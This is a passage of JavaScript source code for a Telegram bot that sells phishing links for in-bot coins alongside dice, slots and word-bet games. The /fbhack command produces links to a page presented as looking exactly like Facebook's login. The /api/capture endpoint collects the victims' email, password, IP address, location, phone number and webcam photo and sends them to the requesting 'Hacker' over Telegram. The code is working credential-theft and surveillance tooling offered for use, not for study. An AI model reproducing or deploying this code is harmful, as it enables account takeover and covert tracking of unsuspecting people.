      `📘 **FACEBOOK PHISHING PAGE** 📘\n\n📌 Usage: /fbhack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures: Email/Password + Camera + Location\n⏰ Expires in 1 HOUR!\n\n🎯 Looks EXACTLY like Facebook!\n📝 Example: /fbhack fb_login`
    );
    return;
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) {
    return sendDopeMessage(ctx, `❌ Need ${TRACK_COST} coins! You have ${user.coins}`);
  }
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.facebookHacks = (user.facebookHacks || 0) + 1;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  let expiresAt = Date.now() + (60 * 60 * 1000);
  
  facebookTokens.set(token, { userId: ctx.from.id, username: ctx.from.username, label, expiresAt });
  setTimeout(() => facebookTokens.delete(token), 60 * 60 * 1000);
  
  let hackLink = `${DOMAIN}/facebook.html?token=${token}`;
  
  await sendDopeMessage(ctx,
    `📘 **FACEBOOK PHISHING READY** 📘\n\n🎯 Label: ${label}\n💰 Cost: -${TRACK_COST} COINS\n📘 Total FB Hacks: ${user.facebookHacks}\n⏰ Expires in 1 HOUR\n\n🔗 \`${hackLink}\`\n\n⚠️ Send this Facebook login page to your target!\n⚠️ Looks 100% real - captures everything!`
  );
});

// ========== 📝 WORD BATTLE ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    await sendDopeMessage(ctx,
      `📝 **WORD BATTLE - 1v1** 📝\n\nUsage: /wordbattle @username amount difficulty\n\nDifficulties:\n🍃 easy - 45s, 3 letters (1x)\n⚡ medium - 30s, 5 letters (2x)\n🔥 hard - 15s, 7 letters (3x)\n💀 expert - 8s, 9 letters (5x)\n\n💰 Bet: ${WORD_MIN_BET}-${WORD_MAX_BET} coins`
    );
    return;
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficulties[difficulty]) return sendDopeMessage(ctx, "❌ Invalid difficulty!");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return sendDopeMessage(ctx, `❌ Min bet ${WORD_MIN_BET}!`);
  if (betAmount > WORD_MAX_BET) return sendDopeMessage(ctx, `❌ Max bet ${WORD_MAX_BET}!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return sendDopeMessage(ctx, "❌ User not found!");
  if (targetId === ctx.from.id) return sendDopeMessage(ctx, "❌ Can't battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return sendDopeMessage(ctx, `❌ Need ${betAmount} coins!`);
  
  let diff = difficulties[difficulty];
  wordChallenges.set(targetId, { from: ctx.from.id, bet: betAmount, difficulty, letterCount: diff.letters, status: "waiting", timer: diff.timer });
  
  setTimeout(() => { if (wordChallenges.get(targetId)?.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await sendDopeMessage(ctx, `✅ Challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n⚡ ${diff.name}\n⏳ Waiting for acceptance...`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!**\n\n👤 From: @${ctx.from.username}\n💰 Bet: ${betAmount} coins\n⚡ ${diff.name}\n\nType /acceptword to accept!`);
});

bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge || challenge.status !== "waiting") return sendDopeMessage(ctx, "❌ No active challenge!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return sendDopeMessage(ctx, `❌ Need ${challenge.bet} coins to accept!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficulties[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!**\n\nNeed: ${challenge.letterCount} letters\n⏱️ Time: ${diff.timer}s\n💰 Pot: ${challenge.bet * 2} coins\n\nType a ${challenge.letterCount}-letter word NOW!`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      await addCoin(ctx.from.id, challenge.bet * 2);
      await addXP(ctx.from.id, 10);
      await ctx.telegram.sendMessage(challenge.from, `🎉 You win! +${challenge.bet * 2} coins!`);
      await ctx.telegram.sendMessage(ctx.from.id, `💀 You lost! -${challenge.bet} coins`);
    }
  }, diff.timer * 1000);
  
  await sendDopeMessage(ctx, `✅ Challenge accepted! Pot: ${challenge.bet * 2} coins`);
});

// ========== OTHER COMMANDS ==========
bot.command("leaderboard", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 15);
  let message = "🏆 **TOP 15 RICHEST** 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    let medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} ${i+1}. @${name} - ${sorted[i].coins} coins (Lvl ${sorted[i].level})\n`;
  }
  await sendDopeMessage(ctx, message);
});

bot.command("balance", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  await sendDopeMessage(ctx, `💰 **BALANCE**\n\nCoins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`); 
});

bot.command("profile", async (ctx) => {
  let u = await initUser(ctx.from.id);
  let progress = Math.floor((u.xp / (u.level * 100)) * 100);
  let bar = "█".repeat(Math.floor(progress/10)) + "░".repeat(10 - Math.floor(progress/10));
  await sendDopeMessage(ctx, 
    `👤 **PROFILE**\n\n🎯 ${ctx.from.first_name}\n💰 Coins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n📈 XP: ${u.xp}/${u.level * 100}\n[${bar}] ${progress}%\n💀 Hacks: ${u.hacks}\n📘 FB Hacks: ${u.facebookHacks || 0}\n📝 Word Wins: ${u.wordWins}\n👥 Referrals: ${u.referrals}`
  );
});

bot.command("daily", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  if (u.lastDaily && now - u.lastDaily < 86400000) { 
    let remaining = 86400000 - (now - u.lastDaily);
    let h = Math.floor(remaining / 3600000); 
    let m = Math.floor((remaining % 3600000) / 60000);
    return sendDopeMessage(ctx, `⏰ ${h}h ${m}m left until next daily!`); 
  } 
  await addCoin(ctx.from.id, DAILY_REWARD);
  u.lastDaily = new Date(now);
  u.streak = (u.streak % 7) + 1;
  await saveUser(ctx.from.id, u);
  await sendDopeMessage(ctx, `🎁 **DAILY REWARD**\n✨ +${DAILY_REWARD} COINS!\n🔥 Streak: Day ${u.streak}/7`); 
});

bot.command("work", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  let last = workCD.get(u.userId) || 0; 
  if (now - last < 12 * 60 * 60 * 1000) { 
    let h = Math.floor((12 * 60 * 60 * 1000 - (now - last)) / 3600000); 
    return sendDopeMessage(ctx, `⏰ ${h}h left until you can work again!`); 
  } 
  let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Tester", "📊 Analyst", "🕵️ Hacker", "👨‍💻 Coder"]; 
  let job = jobs[Math.floor(Math.random() * jobs.length)]; 
  await addCoin(u.userId, WORK_REWARD);
  workCD.set(u.userId, now); 
  await sendDopeMessage(ctx, `💼 Worked as ${job}!\n+${WORK_REWARD} coins`); 
});

bot.command("redeem", async (ctx) => { 
  let args = ctx.message.text.split(" "); 
  if (args.length < 2) return sendDopeMessage(ctx, "❌ Usage: /redeem CODE"); 
  let res = await redeemCode(ctx.from.id, args[1]); 
  await sendDopeMessage(ctx, res.msg); 
});

bot.command("dice", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 1) return sendDopeMessage(ctx, "❌ Usage: /dice amount (min 1 coin)");
  if (u.coins < bet) return sendDopeMessage(ctx, `❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  
  if (roll === 6) {
    let winAmount = bet * 3;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 5);
    await ctx.replyWithDice();
    await sendDopeMessage(ctx, `🎲 Rolled ${roll}! 🎉 **JACKPOT!** +${winAmount} coins! +5 XP`);
  } else if (roll >= 4) {
    let winAmount = bet;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 2);
    await ctx.replyWithDice();
    await sendDopeMessage(ctx, `🎲 Rolled ${roll}! 🎉 WIN +${winAmount} coins! +2 XP`);
  } else {
    await ctx.replyWithDice();
    await sendDopeMessage(ctx, `🎲 Rolled ${roll}! 💀 LOSE -${bet} coins`);
  }
});

bot.command("slots", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 5) return sendDopeMessage(ctx, "❌ Usage: /slots amount (min 5 coins)");
  if (u.coins < bet) return sendDopeMessage(ctx, `❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎", "7️⃣"];
  let result = [slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)]];
  
  if (result[0] === result[1] && result[1] === result[2]) {
    let winAmount = bet * 10;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 20);
    await sendDopeMessage(ctx, `🎰 ${result.join(" ")} 🎰\n🎉 **MEGA JACKPOT!** +${winAmount} coins! +20 XP 🎉`);
  } else if (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]) {
    let winAmount = bet * 2;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 5);
    await sendDopeMessage(ctx, `🎰 ${result.join(" ")} 🎰\n🎉 WIN +${winAmount} coins! +5 XP`);
  } else {
    await sendDopeMessage(ctx, `🎰 ${result.join(" ")} 🎰\n💀 LOSE -${bet} coins`);
  }
});

bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "business", "store"];
  const questions = {
    portfolio: ["name", "title", "skill1", "skill2", "skill3", "email"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc", "email", "phone", "address"],
    store: ["store", "tagline", "product1", "product1_price", "product2", "product2_price", "product3", "product3_price", "email"]
  };
  
  if (!template || !templates.includes(template)) {
    return sendDopeMessage(ctx, `🌐 **WEB CREATOR**\n\n/createweb portfolio\n/createweb business\n/createweb store\n💰 Cost: ${WEB_PRICE} coins`);
  }
  
  if (u.coins < WEB_PRICE) return sendDopeMessage(ctx, `❌ Need ${WEB_PRICE} coins!`);
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  await sendDopeMessage(ctx, `✅ Template: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Step 1/${questions[template].length}\nSend: ${questions[template][0]}`);
});

bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return sendDopeMessage(ctx, "📭 No websites yet! /createweb portfolio");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) message += `📌 ${site.name}\n🔗 ${site.url}\n\n`;
  await sendDopeMessage(ctx, message);
});

bot.command("myid", async (ctx) => { 
  await sendDopeMessage(ctx, `🔑 Your ID: \`${ctx.from.id}\``); 
});

bot.command("mylinks", async (ctx) => {
  let active = [];
  for (let [token, data] of hackTokens) if (data.userId === ctx.from.id && Date.now() < data.expiresAt) active.push(`🔗 ${token.substring(0,8)}... - ${data.label}`);
  for (let [token, data] of facebookTokens) if (data.userId === ctx.from.id && Date.now() < data.expiresAt) active.push(`📘 ${token.substring(0,8)}... - ${data.label} (FB)`);
  if (active.length === 0) return sendDopeMessage(ctx, "📭 No active links! Create with /hack or /fbhack");
  await sendDopeMessage(ctx, `🔗 **YOUR ACTIVE LINKS**\n\n${active.join('\n')}\n\n⚠️ Links expire in 1 hour!`);
});

// ========== 👑 ADMIN COMMANDS ==========
function isOwner(userId) { return userId === OWNER_ID; }

bot.command("admin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  await sendDopeMessage(ctx, 
    `👑 **OWNER PANEL** 👑\n\n` +
    `📊 /stats - Bot statistics\n` +
    `👥 /users - Total users\n` +
    `💰 /addcoin @user amount\n` +
    `🎫 /gencode coins diamonds uses hours\n` +
    `📢 /broadcast message\n` +
    `🚫 /banuser @user\n` +
    `✅ /unban @user\n` +
    `🎁 /giveall amount\n` +
    `👑 /setadmin @user\n` +
    `🌐 /allwebsites - View all user websites\n` +
    `📘 /fbhackstats - Facebook hack stats`
  );
});

bot.command("allwebsites", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let websites = await Website.find({}).sort({ createdAt: -1 }).limit(50);
  if (websites.length === 0) return sendDopeMessage(ctx, "📭 No websites found!");
  
  let message = "🌐 **ALL USER WEBSITES** 🌐\n\n";
  for (let site of websites) {
    let owner = await getUsername(site.ownerId);
    message += `📌 ${site.name}\n👤 @${owner}\n📅 ${site.createdAt.toLocaleDateString()}\n\n`;
  }
  await sendDopeMessage(ctx, message);
});

bot.command("fbhackstats", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let total = 0;
  for (let u of usersCache.values()) total += u.facebookHacks || 0;
  await sendDopeMessage(ctx, `📘 **FACEBOOK HACK STATS**\n\n👥 Users with FB hacks: ${Array.from(usersCache.values()).filter(u => (u.facebookHacks || 0) > 0).length}\n📘 Total FB hacks: ${total}`);
});

bot.command("addcoin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  let amt = parseInt(args[2]);
  if (!user || isNaN(amt)) return sendDopeMessage(ctx, "Usage: /addcoin @username amount");
  for (let [id, u] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        u.coins += amt; 
        await saveUser(id, u); 
        await sendDopeMessage(ctx, `✅ +${amt} coins to @${user}\n💰 New balance: ${u.coins}`); 
        await bot.telegram.sendMessage(id, `👑 Owner gave you +${amt} coins!`); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

bot.command("gencode", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = parseInt(args[3]) || 20;
  let hours = parseInt(args[4]) || 24;
  let code = await genCode(coins, diamonds, uses, hours);
  await sendDopeMessage(ctx, `✅ **CODE GENERATED**\n\n\`${code}\`\n💰 ${coins} coins\n💎 ${diamonds} diamonds\n🎫 ${uses} uses\n⏰ ${hours} hours\n\nUse: /redeem ${code}`);
});

bot.command("broadcast", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return sendDopeMessage(ctx, "Usage: /broadcast message");
  let sent = 0, failed = 0;
  for (let [id] of usersCache) {
    try { 
      await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT**\n\n${msg}`); 
      sent++; 
    } catch(e) { failed++; }
    await new Promise(r => setTimeout(r, 100));
  }
  await sendDopeMessage(ctx, `✅ Sent to ${sent} users\n❌ Failed: ${failed}`);
});

bot.command("users", async (ctx) => { 
  if (!isOwner(ctx.from.id)) return; 
  await sendDopeMessage(ctx, `👥 Total Users: ${usersCache.size}`); 
});

bot.command("stats", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let totalCoins = 0, totalHacks = 0, totalFBHacks = 0;
  for (let u of usersCache.values()) {
    totalCoins += u.coins;
    totalHacks += u.hacks || 0;
    totalFBHacks += u.facebookHacks || 0;
  }
  let totalWebsites = await Website.countDocuments();
  await sendDopeMessage(ctx, 
    `📊 **STATISTICS**\n\n` +
    `👥 Users: ${usersCache.size}\n` +
    `💰 Total Coins: ${totalCoins}\n` +
    `💀 Total Hacks: ${totalHacks}\n` +
    `📘 Total FB Hacks: ${totalFBHacks}\n` +
    `🌐 Websites: ${totalWebsites}`
  );
});

bot.command("banuser", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendDopeMessage(ctx, "Usage: /banuser @username");
  for (let [id] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        bannedUsers.add(id); 
        await sendDopeMessage(ctx, `🚫 Banned @${user}`); 
        await bot.telegram.sendMessage(id, "🚫 You have been banned!"); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

bot.command("unban", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendDopeMessage(ctx, "Usage: /unban @username");
  for (let [id] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        bannedUsers.delete(id); 
        await sendDopeMessage(ctx, `✅ Unbanned @${user}`); 
        await bot.telegram.sendMessage(id, "✅ You have been unbanned!"); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

bot.command("giveall", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return sendDopeMessage(ctx, "Usage: /giveall amount");
  let count = 0;
  for (let [id, u] of usersCache) { 
    u.coins += amount; 
    await saveUser(id, u); 
    count++; 
  }
  await sendDopeMessage(ctx, `✅ Added ${amount} coins to ${count} users`);
});

bot.command("setadmin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return sendDopeMessage(ctx, "Usage: /setadmin @username");
  for (let [id, u] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        u.isAdmin = true; 
        await saveUser(id, u); 
        await sendDopeMessage(ctx, `✅ @${user} is now admin!`); 
        await bot.telegram.sendMessage(id, "👑 You are now an admin!"); 
        return; 
      } 
    } catch(e) {}
  }
  sendDopeMessage(ctx, "❌ User not found");
});

// ========== 🎛️ BUTTON HANDLERS ==========
bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n⏰ Links expire in 1 HOUR!`); });
bot.action("menu_fbhack", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `📘 **FACEBOOK HACK**\n\n/fbhack [label]\n💰 Cost: ${TRACK_COST} coins\n🎯 Looks exactly like Facebook!\n📸 Steals login + camera + location\n⏰ Expires in 1 HOUR!`); });
bot.action("menu_word", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty\n💰 Winner takes ALL!`); });
bot.action("menu_web", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🌐 **WEB CREATOR**\n\n/createweb portfolio\n/createweb business\n/createweb store\n💰 Cost: ${WEB_PRICE} coins`); });
bot.action("menu_casino", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🎰 **CASINO**\n\n/dice amount\n/slots amount`); });
bot.action("menu_games", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🎮 **GAMES**\n\n/dice\n/slots\n/wordbattle`); });
bot.action("menu_eco", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await sendDopeMessage(ctx, `💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily\n/work`); });
bot.action("menu_leaderboard", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🏆 **LEADERBOARDS**\n\n/leaderboard\n/topwords`); });
bot.action("menu_profile", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await sendDopeMessage(ctx, `👤 **PROFILE**\n\nCoins: ${u.coins}\nLevel: ${u.level}\nHacks: ${u.hacks}\nFB Hacks: ${u.facebookHacks || 0}\nWord Wins: ${u.wordWins}`); });
bot.action("menu_shop", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🛒 **SHOP**\n\n/buy diamonds - 50 coins for 100💎\n/buy ticket - 5 coins (lottery)\n/buy mystery - 20 coins (random reward)`); });
bot.action("menu_redeem", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🎁 **REDEEM**\n\n/redeem CODE`); });
bot.action("menu_ref", async (ctx) => { await ctx.answerCbQuery(); await sendDopeMessage(ctx, `🔗 **REFERRAL**\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`); });
bot.action("menu_admin", async (ctx) => { 
  let user = await initUser(ctx.from.id); 
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) { 
    await ctx.answerCbQuery("❌ Admin only!"); 
    return; 
  } 
  await ctx.answerCbQuery(); 
  await sendDopeMessage(ctx, `👑 **ADMIN**\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin\n/allwebsites\n/fbhackstats`); 
});

// ========== 📝 TEXT HANDLER ==========
bot.on("text", async (ctx) => {
  if (ctx.message.text.startsWith("/")) return;
  
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      
      if (build.step < build.questions.length) {
        await sendDopeMessage(ctx, `📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
      } else {
        await sendDopeMessage(ctx, "⏳ Generating your website...");
        
        let html = htmlTemplates[build.template](build.data);
        let siteName = build.data[build.questions[0]] || "mywebsite";
        let fileName = `${siteName.replace(/[^a-z0-9]/gi, '_')}.html`;
        
        await ctx.replyWithDocument({ source: Buffer.from(html, 'utf-8'), filename: fileName });
        await sendDopeMessage(ctx, `✅ **WEBSITE READY!**\n\n📁 File: ${fileName}\n\n🌐 Upload to Netlify Drop for live link!`);
        
        let website = new Website({ name: siteName, ownerId: ctx.from.id, template: build.template, content: build.data, url: "Upload to Netlify Drop" });
        await website.save();
        
        let user = usersCache.get(ctx.from.id);
        user.websites.push({ name: siteName, url: "Upload to Netlify Drop" });
        await saveUser(ctx.from.id, user);
        webBuilds.delete(ctx.from.id);
      }
    }
    return;
  }
  
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      if (answer.length === challenge.letterCount) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challenge.from, challenge.bet * 2);
        await addXP(challenge.from, 10);
        await sendDopeMessage(ctx, `🎉 CORRECT! Won ${challenge.bet * 2} coins! +10 XP`);
        await ctx.telegram.sendMessage(challengedId, `💀 You lost! Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        await addXP(challengedId, 10);
        await sendDopeMessage(ctx, `❌ WRONG! Needed ${challenge.letterCount} letters! Lost ${challenge.bet} coins`);
        await ctx.telegram.sendMessage(challengedId, `🎉 You win! Won ${challenge.bet * 2} coins! +10 XP`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== 🌐 API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location, number, country, code, userAgent, email, password } = req.body;
    if (!token) return res.status(400).json({ error: "No token" });
    
    let data = hackTokens.get(token);
    let isFacebook = false;
    
    if (!data) {
      data = facebookTokens.get(token);
      isFacebook = true;
    }
    
    if (!data) return res.status(404).json({ error: "Link expired or invalid" });
    if (Date.now() > data.expiresAt) {
      hackTokens.delete(token);
      facebookTokens.delete(token);
      return res.status(410).json({ error: "Link has expired" });
    }
    
    let message = `💀 **${isFacebook ? 'FACEBOOK' : 'PHISHING'} SUCCESSFUL** 💀\n\n` +
      `🎯 Label: ${data.label || "No label"}\n` +
      `👤 Hacker: @${data.username}\n` +
      `🕐 Time: ${new Date().toLocaleString()}\n` +
      `📱 IP: ${ip || "Unknown"}\n` +
      `📍 Location: ${location || "Unknown"}\n` +
      (email ? `📧 Email: ${email}\n` : '') +
      (password ? `🔑 Password: ${password}\n` : '') +
      (number ? `📞 Number: ${number}\n` : '') +
      `✨ +20 XP EARNED!`;
    
    if (image && image.length > 100) {
      try { 
        await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message }); 
      } catch(e) { 
        await bot.telegram.sendMessage(data.userId, message); 
      }
    } else { 
      await bot.telegram.sendMessage(data.userId, message); 
    }
    
    await addXP(data.userId, 20);
    
    if (isFacebook) {
      let user = usersCache.get(data.userId);
      if (user) {
        user.facebookHacks = (user.facebookHacks || 0) + 1;
        await saveUser(data.userId, user);
      }
      facebookTokens.delete(token);
    } else {
      hackTokens.delete(token);
    }
    
    res.json({ status: "success", message: "Captured successfully" });
  } catch(e) { 
    console.error("Capture error:", e); 
    res.status(500).json({ error: "Internal error" }); 
  }
});

app.get("/api/check/:token", (req, res) => {
  let token = req.params.token;
  let data = hackTokens.get(token) || facebookTokens.get(token);
  if (!data) return res.json({ valid: false, reason: "Link not found" });
  if (Date.now() > data.expiresAt) return res.json({ valid: false, reason: "Link expired" });
  res.json({ valid: true, expiresIn: `${Math.floor((data.expiresAt - Date.now()) / 60000)} minutes`, label: data.label });
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  res.json({ url: `${DOMAIN}/uploads/${req.file.filename}` });
});

// Serve Facebook hack page
app.get("/facebook.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "facebook.html"));
});

app.get("/", (req, res) => { 
  res.sendFile(path.join(__dirname, "public", "index.html")); 
});

// ========== 🚀 START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));

loadData().then(async () => {
  try {
    await bot.telegram.deleteWebhook();
    await bot.launch({ dropPendingUpdates: true });
    console.log(`🤖 SLIME TRACKERX v69.0 LIVE!`);
    console.log(`✅ FORCE JOIN ALWAYS ON`);
    console.log(`✅ FACEBOOK PHISHING READY`);
    console.log(`✅ AUTO-DELETE MENUS ACTIVE`);
  } catch(e) { 
    console.log("Error:", e.message); 
  }
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
